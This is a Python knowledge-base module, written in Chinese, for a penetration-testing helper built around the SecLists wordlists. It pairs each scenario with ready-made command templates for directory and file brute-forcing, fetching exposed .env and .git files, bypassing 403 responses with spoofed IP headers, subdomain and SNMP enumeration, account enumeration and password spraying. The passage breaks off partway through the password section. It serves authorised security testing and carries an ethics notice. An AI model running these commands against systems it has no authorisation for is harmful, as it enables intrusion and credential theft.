# -*- coding: utf-8 -*-
"""SecLists 助手的知识库：分类说明、快速上手、场景引导、命令模板、速查手册。"""

from __future__ import annotations

import os
import re

# --------------------------------------------------------------------------
# 顶层分类说明（键与仓库顶层目录同名）
# --------------------------------------------------------------------------
CATEGORY_INFO = {
    "Discovery": ("🔍 发现与枚举", "Web 目录/文件、DNS 子域名、变量名、基础设施、文件系统等枚举字典。日常渗透用得最多的一类。"),
    "Passwords": ("🔑 口令字典", "常见口令、泄露库、默认凭据、WiFi/WPA、哈希、键盘路径、排列组合。"),
    "Fuzzing": ("💥 模糊测试载荷", "XSS / SQLi / LFI / 命令注入 / XXE / SSTI / 特殊字符集等各类 payload 与字符表。"),
    "Usernames": ("👤 用户名", "常见用户名、真实姓名、设备/系统默认账户名。"),
    "Payloads": ("📦 特殊载荷文件", "Zip 炸弹、路径穿越压缩包、畸形文件名、EICAR 测试文件等（上传功能测试用）。"),
    "Web-Shells": ("🐚 WebShell 样本", "PHP / JSP / ASPX 等 WebShell，用于授权测试与检测规则验证。"),
    "Pattern-Matching": ("🧬 正则匹配", "源码审计用的敏感信息关键字/正则。"),
    "Ai": ("🤖 AI/LLM 测试", "大模型应用的越狱、偏见、数据泄露、记忆召回测试提示词。"),
    "Miscellaneous": ("🧩 杂项词表", "多语言单词表、HTTP 头、安全问题答案、源码片段、昵称等。"),
    ".bin": ("🛠 官方脚本", "仓库自带的字典生成/校验脚本（wordlist-updaters、checkers 等）。"),
    ".github": ("⚙️ 仓库配置", "GitHub Actions 与 Issue 模板。"),
}

# 各分类的「入门首选」文件，用于导航树里的提示
CATEGORY_STARTERS = {
    "Discovery": "Discovery/Web-Content/raft-medium-directories.txt",
    "Passwords": "Passwords/Common-Credentials/10k-most-common.txt",
    "Usernames": "Usernames/top-usernames-shortlist.txt",
    "Fuzzing": "Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt",
    "Payloads": "Payloads/README.md",
    "Web-Shells": "Web-Shells/PHP/Dysco.php",
    "Pattern-Matching": "Pattern-Matching/Source-Code-(PHP)/php-auditing.txt",
    "Ai": "Ai/LLM_Testing/README.md",
    "Miscellaneous": "Miscellaneous/Web/session-id.txt",
}

GROUPS = [
    ("start", "🚀 快速上手"),
    ("discover", "🗂 内容与接口发现"),
    ("recon", "🌐 资产侦察"),
    ("creds", "🔑 口令与账户"),
    ("payload", "💥 注入与载荷"),
    ("special", "📦 特殊场景 / AI / 合规"),
]

QUICK_START_STEPS = [
    ("① 填目标", "右上角填域名 / IP / URL，命令里的 {url}、{host}、{domain} 会自动替换。"),
    ("② 选场景", "左侧挑一个场景，右侧告诉你要用哪些字典、为什么用它。"),
    ("③ 拿命令", "命令已填好字典路径，点「复制」粘到终端即可执行。"),
    ("④ 看字典", "点「预览」确认字典是否合适，或用「全库搜索」按关键字找字典。"),
]

ETHICS_NOTICE = ("⚠️ 仅限授权测试：本工具只帮助定位字典与生成命令，不代替授权。"
                 "请仅对你自己拥有或已获得书面授权的目标使用这些字典与命令。")

# --------------------------------------------------------------------------
# 场景引导
# --------------------------------------------------------------------------
SCENARIOS = [
    # ================================================== 快速上手
    {
        "id": "quickstart",
        "group": "start",
        "title": "第一次用 SecLists：5 分钟上手",
        "level": "入门",
        "summary": "SecLists 不是软件，而是一堆「字典文件」。渗透测试的每个环节几乎都要喂一份字典给工具，"
                   "本页告诉你：先看哪几个文件、怎么把它们接到 ffuf / gobuster / hydra 上。",
        "why": "新手最常见的困惑是「我要爆破目录，该用哪个 txt」。"
               "仓库按用途分了 9 个大类，只要记住「目录用 Discovery/Web-Content、子域名用 Discovery/DNS、"
               "口令用 Passwords、载荷用 Fuzzing」就够了。",
        "lists": [
            {"key": "starter_dirs", "path": "Discovery/Web-Content/raft-medium-directories.txt",
             "note": "中量级目录字典，约 3 万行，日常爆破首选（速度与覆盖率平衡）"},
            {"key": "starter_small", "path": "Discovery/Web-Content/raft-small-directories.txt",
             "note": "小字典，约 1 万行，先跑一遍摸底"},
            {"key": "starter_subs", "path": "Discovery/DNS/subdomains-top1million-5000.txt",
             "note": "5000 条高频子域名，先跑这个再上大字典"},
            {"key": "starter_pass", "path": "Passwords/Common-Credentials/10k-most-common.txt",
             "note": "一万条最常见口令，口令喷洒起步用"},
        ],
        "commands": [
            {"tool": "目录摸底", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {starter_small} -mc all -fc 404 -t 40",
             "note": "先小字典快速摸底，看目标返回 200/301/403 的规律"},
            {"tool": "子域名摸底", "shell": "bash",
             "cmd": "gobuster dns -d {domain} -w {starter_subs} -t 50 --timeout 3s",
             "note": "DNS 枚举不碰目标 Web 服务，噪声小"},
        ],
        "tips": [
            "字典是「文本文件」，一行一条，用记事本就能看：在本界面双击文件即可预览。",
            "大字典（几十万行以上）请配合工具的并发/限速参数，别把目标打挂。",
            "每次实战前先确认字典里有目标技术栈的特征词（如 wordpress、spring、/api/）。",
            "本界面「速查手册」标签页有工具与字典的对照表，忘了就翻。",
        ],
    },
    # ================================================== 内容与接口发现
    {
        "id": "web-dir",
        "group": "discover",
        "title": "Web 目录 / 文件爆破",
        "level": "入门",
        "summary": "给 ffuf / gobuster / feroxbuster / dirsearch 找一份「目录名 + 文件名」字典，"
                   "把目标站点里没在页面上暴露的路径扫出来：后台、备份、上传点、配置文件……",
        "why": "Discovery/Web-Content 下的字典分两大家族："
               "raft-* 是现代抓取整理的（带目录/文件/扩展名区分，推荐），"
               "DirBuster-2007_* 是经典的 directory-list-2.3（覆盖广但含大量 2007 年前的老路径）。",
        "lists": [
            {"key": "small", "path": "Discovery/Web-Content/raft-small-directories.txt",
             "note": "≈1 万行，第一次摸底"},
            {"key": "medium", "path": "Discovery/Web-Content/raft-medium-directories.txt",
             "note": "≈3 万行，日常主力"},
            {"key": "large", "path": "Discovery/Web-Content/raft-large-directories.txt",
             "note": "≈5.6 万行，覆盖优先"},
            {"key": "dirbuster", "path": "Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt",
             "note": "经典 2.3 中量级，注意文件里以 # 开头的是注释行"},
            {"key": "files", "path": "Discovery/Web-Content/raft-medium-files.txt",
             "note": "文件名（含扩展名）字典，适合直接扫具体文件"},
            {"key": "ext", "path": "Discovery/Web-Content/web-extensions.txt",
             "note": "扩展名清单，配合 -e 使用"},
        ],
        "commands": [
            {"tool": "ffuf", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {medium} -mc all -fc 404 -ac -t 50 -o ffuf-webdir.json -of json",
             "note": "-ac 自动校准过滤误报；-fc 404 过滤不存在；结果同时写 json"},
            {"tool": "ffuf（带扩展名）", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {files} -e .php,.html,.js,.txt,.bak -mc all -fc 404 -t 50",
             "note": "扫文件名时用 -e 追加扩展名，等价于对每条都试这些后缀"},
            {"tool": "ffuf（递归两层）", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {small} -recursion -recursion-depth 2 -fc 404 -t 40",
             "note": "发现目录后自动往下一层继续扫，注意耗时成倍增长"},
            {"tool": "feroxbuster", "shell": "bash",
             "cmd": "feroxbuster -u {url} -w {medium} -t 50 --auto-tune -x php,html,txt,bak -o ferox-webdir.txt",
             "note": "递归能力强，适合单站点深挖；结果同时落盘"},
            {"tool": "gobuster", "shell": "bash",
             "cmd": "gobuster dir -u {url} -w {medium} -t 50 -k --random-agent -o gobuster-webdir.txt",
             "note": "-k 忽略证书错误；--random-agent 规避简单 UA 拦截"},
            {"tool": "dirsearch", "shell": "bash",
             "cmd": "dirsearch -u {url} -w {medium} -t 30 --random-agent -e php,html,js,txt,bak --full-url",
             "note": "自带报告与状态码着色，适合快速出结果"},
            {"tool": "wfuzz", "shell": "bash",
             "cmd": "wfuzz -c -z file,{medium} --hc 404 -t 40 {url}/FUZZ",
             "note": "经典 fuzzer，--hc 按状态码过滤"},
        ],
        "tips": [
            "先小字典跑一遍拿到「基线响应」（一般 404 页的长度/字数），再用 -fs（长度过滤）或 -fc 过滤，能大幅减少噪音。",
            "WAF 在前时降低 -t（如 10~20）并加 --random-agent，或给 ffuf 加 -p 0.1（每条间隔 0.1 秒）。",
            "扫到 403 目录别急着放弃 → 看「访问控制绕过 / 403」场景。",
            "target 路径带子目录时把 {url} 换成 https://host/app 形式，字典路径才拼得对。",
        ],
    },
    {
        "id": "web-files",
        "group": "discover",
        "title": "敏感文件 / 备份文件 / 配置泄露",
        "level": "入门",
        "summary": "找 .git、.env、备份包（.zip/.tar.gz/.bak/.old）、数据库导出、编辑器临时文件、"
                   "SSH/云厂商凭证文件等「本来不该被下载到」的文件。",
        "why": "Common-DB-Backups.txt 专注数据库备份命名；quickhits.txt 是短小精悍的高命中率清单；"
               "UnixDotfiles.fuzz.txt 覆盖 .htaccess / .bash_history 之类的点文件；"
               "default-web-root-directory-*.txt 是各中间件的默认目录。",
        "lists": [
            {"key": "quickhits", "path": "Discovery/Web-Content/quickhits.txt",
             "note": "高频命中清单，几十行但价值极高，建议每次都跑"},
            {"key": "backups", "path": "Discovery/Web-Content/Common-DB-Backups.txt",
             "note": "数据库备份文件名（.sql/.bak/.dump 等）"},
            {"key": "files", "path": "Discovery/Web-Content/raft-medium-files.txt",
             "note": "通用文件名，配合大量扩展名一起扫"},
            {"key": "dotfiles", "path": "Discovery/Web-Content/UnixDotfiles.fuzz.txt",
             "note": ".git/config、.env、.svn、.DS_Store 等"},
            {"key": "linuxroot", "path": "Discovery/Web-Content/default-web-root-directory-linux.txt",
             "note": "Linux 中间件默认目录（tomcat、weblogic、jenkins…）"},
            {"key": "winroot", "path": "Discovery/Web-Content/default-web-root-directory-windows.txt",
             "note": "IIS / Exchange / SharePoint 等默认目录"},
            {"key": "j2ee", "path": "Discovery/Web-Content/vulnerability-scan_j2ee-websites_WEB-INF.txt",
             "note": "Java 应用 WEB-INF 敏感路径"},
        ],
        "commands": [
            {"tool": "ffuf（备份后缀全家桶）", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {files} -e .bak,.old,.orig,.save,.swp,.zip,.tar.gz,.tgz,.rar,.7z,.sql,.dump,.env,.git,.idea -mc all -fc 404 -t 40",
             "note": "对每个文件名套上常见备份后缀，命中率很高"},
            {"tool": "ffuf（高价值清单）", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {quickhits} -mc all -fc 404 -t 30",
             "note": "先跑这个，几十个请求可能直接出结果"},
            {"tool": "ffuf（数据库备份）", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {backups} -mc all -fc 404 -t 30",
             "note": "常出现在 /backup、/db、/sql 等目录下，可先扫目录再进目录扫这个"},
            {"tool": "ffuf（点文件）", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {dotfiles} -mc all -fc 404 -t 20",
             "note": ".git/config、.env 一旦可读，往往等于拿到源码或凭证"},
            {"tool": "curl 快速验证", "shell": "bash",
             "cmd": "curl -skI {url}/.git/config ; curl -sk {url}/.env | head -30",
             "note": "手工确认几个最常见的，比盲目扫描快"},
            {"tool": "gobuster", "shell": "bash",
             "cmd": "gobuster dir -u {url} -w {linuxroot} -t 30 -k -x bak,old,zip,tar.gz,sql",
             "note": "针对 Linux 中间件默认路径做一轮"},
        ],
        "tips": [
            "备份文件常是 200 但内容为空（比如 .bak 返回首页），要用 -fs 按响应长度过滤。",
            "找到 .git 目录可用 git-dumper 拉取源码：git-dumper {url}/.git/ ./src。",
            "找到 .env / config 后记得看是否含 DB、云 AK/SK、JWT 密钥。",
            "别下载超大备份到本地磁盘（可能几个 G），先只确认 HTTP 头（Content-Length）。",
        ],
    },
    {
        "id": "api-param",
        "group": "discover",
        "title": "API 端点与参数名枚举",
        "level": "进阶",
        "summary": "发现未公开的 API 端点、REST 资源名、动作名（action/objects），"
                   "以及接口里可用的参数名（用于越权、注入、Mass Assignment 等测试）。",
        "why": "Discovery/Web-Content/api/ 下有 endpoints（路径）、objects（资源名）、actions（动作名）三件套；"
               "burp-parameter-names.txt 是 Burp Suite 默认参数名清单，覆盖大多数框架的参数命名习惯。",
        "lists": [
            {"key": "params", "path": "Discovery/Web-Content/burp-parameter-names.txt",
             "note": "≈6000 个常见参数名（id、user、token、redirect…）"},
            {"key": "endpoints", "path": "Discovery/Web-Content/api/api-endpoints.txt",
             "note": "常见 API 路径（/api/v1/users、/graphql…）"},
            {"key": "objects", "path": "Discovery/Web-Content/api/objects.txt",
             "note": "REST 资源名（users、orders、invoices…）"},
            {"key": "actions", "path": "Discovery/Web-Content/api/actions.txt",
             "note": "动作名（login、upload、export…）"},
            {"key": "urlparams", "path": "Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt",
             "note": "从热门应用里抓的真实参数名"},
            {"key": "graphql", "path": "Discovery/Web-Content/graphql.txt",
             "note": "GraphQL 常见端点与字段"},
            {"key": "urls", "path": "Discovery/Web-Content/uri-from-top-55-most-popular-apps.txt",
             "note": "真实应用的常见 URI 片段"},
        ],
        "commands": [
            {"tool": "ffuf（端点）", "shell": "bash",
             "cmd": "ffuf -u {url}/api/FUZZ -w {endpoints} -mc all -fc 404 -t 30 -o ffuf-api.json -of json",
             "note": "先摸清 API 版本与路径前缀，再改 {url} 指向 /api/v1 等"},
            {"tool": "ffuf（资源名）", "shell": "bash",
             "cmd": "ffuf -u {url}/api/v1/FUZZ -w {objects} -mc all -fc 401,404 -t 30",
             "note": "401 也值得记录：说明端点存在只是要认证"},
            {"tool": "ffuf（参数名，GET）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/api/user?FUZZ=1\" -w {params} -fs 0 -mc all -t 30",
             "note": "先量出「参数无效时」的响应长度，再用 -fs 过滤掉它"},
            {"tool": "arjun（参数发现）", "shell": "bash",
             "cmd": "arjun -u {url}/api/user -w {params} -m GET,POST --stable",
             "note": "比手工 fuzz 更聪明：自动学习响应差异，支持 JSON 参数"},
            {"tool": "x8（参数发现）", "shell": "bash",
             "cmd": "x8 -u \"{url}/api/user\" -w {params} -o x8-params.txt",
             "note": "Rust 实现，速度快，适合批量 URL"},
            {"tool": "GraphQL 内省", "shell": "bash",
             "cmd": "curl -sk {url}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name}}}}\"}'",
             "note": "内省未关闭时可直接拿到完整 schema；也可用 graphql-cop / clairvoyance"},
        ],
        "tips": [
            "参数 fuzz 的关键是「基线」：先请求一个绝对不存在的参数，记下响应长度，再用 -fs 过滤。",
            "发现参数名后重点测：越权（user_id 改别人）、Mass Assignment（role=admin）、SSRF（url=）、重定向（redirect=）。",
            "带 JSON body 的接口用 ffuf 的 -d 与 -H 'Content-Type: application/json' 组合。",
            "Swagger/OpenAPI 泄露（/swagger-ui.html、/v3/api-docs、/openapi.json）比 fuzz 更快拿全接口。",
        ],
    },
    {
        "id": "vhost-403",
        "group": "discover",
        "title": "访问控制绕过 / 403 / 路径混淆",
        "level": "高级",
        "summary": "目录扫出来是 403 或 401 时，尝试用 HTTP 方法、请求头、路径变形绕过前置代理/网关的访问控制。",
        "why": "绕过往往靠「中间件解析差异」而不是字典：方法清单、反向代理不一致路径、Web 头字段是三类可枚举的输入。",
        "lists": [
            {"key": "methods", "path": "Fuzzing/http-request-methods.txt",
             "note": "各种 HTTP 方法，试 OPTIONS/PUT/PATCH/TRACE 等非预期方法"},
            {"key": "rpi", "path": "Discovery/Web-Content/reverse-proxy-inconsistencies.txt",
             "note": "反向代理路径不一致变形（/admin/..;/、//admin、/./admin 等）"},
            {"key": "headers", "path": "Miscellaneous/Web/http-request-headers/http-request-headers-fields-large.txt",
             "note": "冷门请求头字段，用于 IP 伪造（X-Forwarded-For 家族）"},
        ],
        "commands": [
            {"tool": "ffuf（路径变形）", "shell": "bash",
             "cmd": "ffuf -u {url}/FUZZ -w {rpi} -mc all -fc 404 -t 20",
             "note": "用 /admin 作为目标时，把 FUZZ 放在 /admin/FUZZ 位置试另一种变形"},
            {"tool": "ffuf（HTTP 方法）", "shell": "bash",
             "cmd": "for m in $(cat {methods}); do code=$(curl -sk -o /dev/null -w '%{http_code}' -X $m {url}/admin); echo \"$code  $m\"; done",
             "note": "ffuf 各版本对 -X FUZZ 支持不一，用循环最稳"},
            {"tool": "curl（伪装来源 IP）", "shell": "bash",
             "cmd": "curl -sk -o /dev/null -w '%{http_code}\\n' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' {url}/admin",
             "note": "很多网关只看这几个头就放行内部访问"},
            {"tool": "ffuf（头名字 fuzz）", "shell": "bash",
             "cmd": "ffuf -u {url}/admin -H \"FUZZ: 127.0.0.1\" -w {headers} -mc all -fc 403 -t 20",
             "note": "暴力试「哪个头能骗过网关」，噪声较大，注意目标日志"},
            {"tool": "nuclei（现成模板）", "shell": "bash",
             "cmd": "nuclei -u {url} -tags exposure,misconfiguration -severity medium,high,critical -o nuclei-web.txt",
             "note": "先用模板扫一遍，很多 403 绕过/敏感文件模板已经写好"},
        ],
        "tips": [
            "本仓库 Fuzzing/403/403.md 专门讲 403 绕过思路，值得先读一遍（本界面可直接预览）。",
            "先确认 403 是「网关拦」还是「应用拦」：网关拦往往只看路径与头，应用拦要看会话与角色。",
            "路径变形配合 --path-as-is 使用 curl，否则 curl 会自己规范化 URL。",
            "测完记得回滚：某些方法（PUT/DELETE）可能真的改到数据。",
        ],
    },
    {
        "id": "wordlist-custom",
        "group": "discover",
        "title": "自建与加工字典（合并 / 去重 / 过滤）",
        "level": "进阶",
        "summary": "用目标站点的真实词汇（公司名、产品名、员工名、页面关键词）造字典，"
                   "再把 SecLists 的字典合并、去重、按长度过滤，得到更贴合目标的清单。",
        "why": "通用字典命中率有限；把目标自己的词汇放大（大小写、年份、符号后缀）往往一击命中。"
               "Miscellaneous/Words 与 .bin 脚本提供了词根与生成工具。",
        "lists": [
            {"key": "words", "path": "Miscellaneous/Words/real_academia_espanola_RAE_spanish_105582_words.txt",
             "note": "示例词表；同目录还有多语言词表"},
            {"key": "perms", "path": "Passwords/Permutations/1337speak.txt",
             "note": "leet 变形对照（a→@、e→3、o→0…）"},
            {"key": "perm2", "path": "Passwords/Permutations/password-permutations.txt",
             "note": "口令排列组合规则"},
            {"key": "envids", "path": "Fuzzing/environment-identifiers.txt",
             "note": "常见环境/变量标识，用于生成参数名变体"},
        ],
        "commands": [
            {"tool": "CeWL 抓站内词", "shell": "bash",
             "cmd": "cewl {url} -d 2 -m 5 -w custom-words.txt --with-numbers",
             "note": "爬目标站点生成专属词表，是提高命中率最有效的一步"},
            {"tool": "合并去重排序", "shell": "bash",
             "cmd": "cat {small} {medium} | tr 'A-Z' 'a-z' | sort -u > merged-dirs.txt",
             "note": "多份字典合并后必须去重，否则重复请求浪费大量时间"},
            {"tool": "按长度过滤", "shell": "bash",
             "cmd": "awk 'length($0)>=3 && length($0)<=20' merged-dirs.txt > filtered.txt",
             "note": "目录名通常在 3~20 字符，去掉噪声条目"},
            {"tool": "生成编号字典", "shell": "bash",
             "cmd": "seq -f '%04g' 0 9999 > pins-4digit.txt",
             "note": "生成 0000~9999 的纯数字字典（验证码、PIN）"},
            {"tool": "官方脚本", "shell": "bash",
             "cmd": "ls {url} >/dev/null; python3 .bin/wordlist-updaters/updater.py --help",
             "note": "依赖网络，注意在仓库根目录执行；生成/校验类脚本在 .bin 下"},
        ],
        "tips": [
            "本界面「工具箱」标签页可以图形化完成：合并、去重、排序、长度过滤、关键字包含/排除、取前 N 行、保存为新字典。",
            "字典里以 # 开头的注释行会被很多工具当成真实条目，记得用工具箱「去掉 # 注释行」。",
            "Windows 段落 CRLF 混入会让字典出现尾随 \\r，用工具箱的「去掉首尾空白」清理。",
        ],
    },
    # ================================================== 资产侦察
    {
        "id": "subdomain",
        "group": "recon",
        "title": "子域名枚举",
        "level": "入门",
        "summary": "用子域名字典做字典爆破（DNS 解析 / 虚拟主机 Host 头两种思路），"
                   "配合被动收集工具，把目标的资产面尽量画全。",
        "why": "Discovery/DNS 下从 5000 条高频到 500 万条全量都有；"
               "dns-Jhaddix.txt 是 Jason Haddix 的经典合集，n0kovo/combined 是社区整理的大合集。",
        "lists": [
            {"key": "subs5k", "path": "Discovery/DNS/subdomains-top1million-5000.txt",
             "note": "5000 条高频子域，第一轮就用它"},
            {"key": "subs20k", "path": "Discovery/DNS/subdomains-top1million-20000.txt",
             "note": "2 万条，第二轮"},
            {"key": "subs110k", "path": "Discovery/DNS/subdomains-top1million-110000.txt",
             "note": "11 万条，深度枚举"},
            {"key": "jhaddix", "path": "Discovery/DNS/dns-Jhaddix.txt",
             "note": "经典合集，含大量历史与开发环境命名"},
            {"key": "bitquark", "path": "Discovery/DNS/bitquark-subdomains-top100000.txt",
             "note": "基于真实解析数据的 10 万条统计字典"},
            {"key": "namelist", "path": "Discovery/DNS/namelist.txt",
             "note": "短前缀清单，适合配合通配符过滤"},
            {"key": "services", "path": "Discovery/DNS/services-names.txt",
             "note": "服务名作前缀（smtp、vpn、git…）"},
        ],
        "commands": [
            {"tool": "gobuster dns", "shell": "bash",
             "cmd": "gobuster dns -d {domain} -w {subs5k} -t 50 --timeout 3s -o gobuster-dns.txt",
             "note": "直接查 DNS，不产生 Web 请求，最安全的第一轮"},
            {"tool": "ffuf（Host 头虚拟主机）", "shell": "bash",
             "cmd": "ffuf -u {url} -H \"Host: FUZZ.{domain}\" -w {subs5k} -fs 0 -t 40 -mc all",
             "note": "先测一个随机子域得到默认响应长度，把它填进 -fs 过滤掉「都一样」的响应"},
            {"tool": "subfinder（被动）", "shell": "bash",
             "cmd": "subfinder -d {domain} -all -silent -o subs-passive.txt",
             "note": "从证书/公开数据源收集，零噪声，先跑它"},
            {"tool": "amass（被动+主动）", "shell": "bash",
             "cmd": "amass enum -passive -d {domain} -o amass-passive.txt",
             "note": "被动模式不触碰目标；去掉 -passive 会做 DNS 爆破与抓取"},
            {"tool": "dnsx（批量验活）", "shell": "bash",
             "cmd": "dnsx -d {domain} -w {subs5k} -silent -a -resp -o dnsx-alive.txt",
             "note": "只保留能解析出 A 记录的，速度快于 nmap/host 循环"},
            {"tool": "massdns（超大规模）", "shell": "bash",
             "cmd": "awk '{print $0\".{domain}\"}' {subs110k} > fqdn.txt && massdns -r resolvers.txt -t A -o S fqdn.txt > massdns-out.txt",
             "note": "需要自备可用的公共 DNS 列表；适合 10 万级以上",
             },
            {"tool": "证书透明度", "shell": "bash",
             "cmd": "curl -s \"https://crt.sh/?q=%25.{domain}&output=json\" | python3 -c \"import sys,json;[print(x['name_value']) for x in json.load(sys.stdin)]\" | sort -u",
             "note": "crt.sh 往往能直接捞出大量真实子域，最省力的方法"},
        ],
        "tips": [
            "注意泛解析（wildcard DNS）：随便编一个子域也能解析，此时必须用 -fs/--exclude-length 过滤默认响应。",
            "子域拿到后接「端口扫描 + Web 指纹 + 截图」组成资产台账，再逐个业务测试。",
            "DNS 爆破噪声其实不小（可能触发内部告警），确认授权范围后控制并发。",
            "记得把结果去重并合并被动收集结果：cat subs-passive.txt dnsx-alive.txt | sort -u > all-subs.txt",
        ],
    },
    {
        "id": "infra-ports",
        "group": "recon",
        "title": "端口 / 服务 / SNMP 侦察",
        "level": "进阶",
        "summary": "用端口清单与 SNMP 团体名清单做基础设施层枚举：开放端口、服务名、网络设备信息。",
        "why": "Discovery/Infrastructure 给的是端口与内网 IP 清单，Discovery/SNMP 是 onesixtyone 用的团体名（community string）字典。",
        "lists": [
            {"key": "top1000", "path": "Discovery/Infrastructure/nmap-ports-top1000.txt",
             "note": "nmap top1000 端口清单，可喂给 nmap -p 或 masscan"},
            {"key": "allports", "path": "Discovery/Infrastructure/Ports-1-To-65535.txt",
             "note": "全端口清单（给 masscan/nmap 用文件形式）"},
            {"key": "httpports", "path": "Discovery/Infrastructure/common-http-ports.txt",
             "note": "常见 HTTP 端口"},
            {"key": "snmp", "path": "Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt",
             "note": "onesixtyone 格式的 SNMP 团体名"},
            {"key": "snmp2", "path": "Discovery/SNMP/snmp.txt",
             "note": "另一种格式的团体名字典"},
        ],
        "commands": [
            {"tool": "nmap 常规", "shell": "bash",
             "cmd": "nmap -sS -sV -Pn -T4 --top-ports 1000 {host} -oA nmap-top1000",
             "note": "服务与版本探测，输出三种格式方便后续分析"},
            {"tool": "nmap 全端口", "shell": "bash",
             "cmd": "nmap -p- --min-rate 2000 -Pn -T4 {host} -oA nmap-allports",
             "note": "先用高速率扫出开放端口，再对具体端口做 -sV 精扫"},
            {"tool": "masscan", "shell": "bash",
             "cmd": "masscan -p1-65535 --rate 2000 --output-format list {host} > masscan-ports.txt",
             "note": "速度极快，速率别开太大以免打瘫网络设备"},
            {"tool": "SNMP 团体名爆破", "shell": "bash",
             "cmd": "onesixtyone -c {snmp} {host}",
             "note": "拿到 community 后用 snmpwalk -v2c -c <community> {host} 提取系统与接口信息"},
            {"tool": "nmap SNMP 脚本", "shell": "bash",
             "cmd": "nmap -sU -p161 --script snmp-info,snmp-sysdescr --script-args snmpcommunity=public {host}",
             "note": "UDP 161 需要 root；先确认端口开放再上字典"},
        ],
        "tips": [
            "内网大范围扫段前先和网络管理员打招呼——masscan 的高速率很容易触发 IPS。",
            "发现 445/3389/5985 等管理端口后，再去「口令与账户」场景做凭据测试。",
            "SNMP 拿到 public/private 常常直接泄露路由表、ARP 表、进程列表。",
        ],
    },
    # ================================================== 口令与账户
    {
        "id": "auth-usernames",
        "group": "creds",
        "title": "用户名枚举 / 账户发现",
        "level": "进阶",
        "summary": "在爆破密码之前，先确认「有哪些用户名有效」："
                   "通过登录接口的响应差异、Kerberos 预认证、SMTP 的 VRFY、SMB 空会话等渠道枚举。",
        "why": "有了有效用户名，密码爆破成功率会显著提升，也能避免大量无效尝试触发锁定。"
               "Usernames 目录按「常见登录名 / 真实姓名 / 系统默认账户」分好了类。",
        "lists": [
            {"key": "short", "path": "Usernames/top-usernames-shortlist.txt",
             "note": "几十个高频用户名，先快跑一轮"},
            {"key": "names", "path": "Usernames/Names/names.txt",
             "note": "常见英文名，适合生成 姓名/姓名缩写 形式的账户"},
            {"key": "cirt", "path": "Usernames/cirt-default-usernames.txt",
             "note": "设备与系统默认账户名（admin、cisco、root…）"},
            {"key": "xato", "path": "Usernames/xato-net-10-million-usernames-dup.txt",
             "note": "千万级用户名去重版（体量大，慎用在线爆破）"},
            {"key": "sap", "path": "Usernames/sap-default-usernames.txt",
             "note": "SAP 默认账户"},
            {"key": "honeypot", "path": "Usernames/Honeypot-Captures/",
             "note": "蜜罐抓到的真实攻击者用户名，可反查攻击者习惯"},
        ],
        "commands": [
            {"tool": "kerbrute（域账户）", "shell": "bash",
             "cmd": "kerbrute userenum -d {domain} --dc {host} {names} -o kerbrute-users.txt",
             "note": "Kerberos 预认证不回锁账户，是域环境最安全的用户枚举方式"},
            {"tool": "nxc（SMB 空会话）", "shell": "bash",
             "cmd": "nxc smb {host} -u {short} -p '' --continue-on-success",
             "note": "空口令尝试，顺便看目标是否允许匿名列举"},
            {"tool": "SMTP VRFY/RCPT", "shell": "bash",
             "cmd": "nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.userdb={cirt} {host}",
             "note": "邮件服务器常能直接枚举出有效邮箱/账户"},
            {"tool": "Web 登录接口", "shell": "bash",
             "cmd": "ffuf -u {url}/login -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ&password=WrongPass!123' -w {short} -fr 'Invalid|incorrect|错误' -mc all -t 10",
             "note": "-fr 过滤「密码错误」类响应；先手工观察错误文案再决定正则"},
            {"tool": "RID 枚举（Windows）", "shell": "bash",
             "cmd": "nxc smb {host} --rid-brute 4000",
             "note": "从 RID 500 开始枚举本地/域账户，不依赖字典"},
            {"tool": "OWA / Exchange", "shell": "bash",
             "cmd": "python3 -c \"print('用 MailSniper: Invoke-UsernameHarvestOWA -ExchHostname {host} -UserList {names} -OutFile owa-users.txt')\"",
             "note": "Exchange 环境下 MailSniper 的 OWA 用户枚举很有效"},
        ],
        "tips": [
            "务必先确认账户锁定策略（net accounts / domain policy），别把管理员账户锁死。",
            "响应时间差异也算「响应差异」：存在的用户可能慢几十毫秒。",
            "枚举出的用户名整理成 users.txt，后面 hydra/nxc 直接用。",
        ],
    },
    {
        "id": "passwords",
        "group": "creds",
        "title": "口令爆破与密码喷洒",
        "level": "入门",
        "summary": "用口令字典对 SSH / RDP / Web 登录 / SMB 等做在线爆破（hydra、nxc）或离线破解；"
                   "喷洒（spray）是指「少量常见口令 × 大量账户」，比爆破更不易触发锁定。",
        "why": "Passwords/Common-Credentials 按「常见度 Top N」排序，越靠前命中率越高，"
               "所以先跑 Top1000/Top10000 再考虑大字典；Leaked-Databases 是真实泄露库（rockyou 最经典）。",
        "lists": [
            {"key": "top500", "path": "Passwords/Common-Credentials/500-worst-passwords.txt",
             "note": "最烂 500 个口令，喷洒首选"},
            {"key": "top10k", "path": "Passwords/Common-Credentials/10k-most-common.txt",
             "note": "Top1 万，在线爆破的甜点区"},
            {"key": "ncsc", "path": "Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt",
             "note": "英国 NCSC 泄露统计 Top10 万"},
            {"key": "pwdb10k", "path": "Passwords/Common-Credentials/Pwdb_top-10000.txt",
             "note": "Pwdb 统计 Top1 万（含近年新口令）"},
            {"key": "cn10k", "path": "Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-10000.txt",
             "note": "中文环境常见口令（拼音、手机号样式）"},
            {"key": "rockyou", "path": "Passwords/Leaked-Databases/rockyou.txt.tar.gz",
             "note": "经典 1400 万条泄露口令；仓库里是 .tar.gz 压缩包，需先解压"},
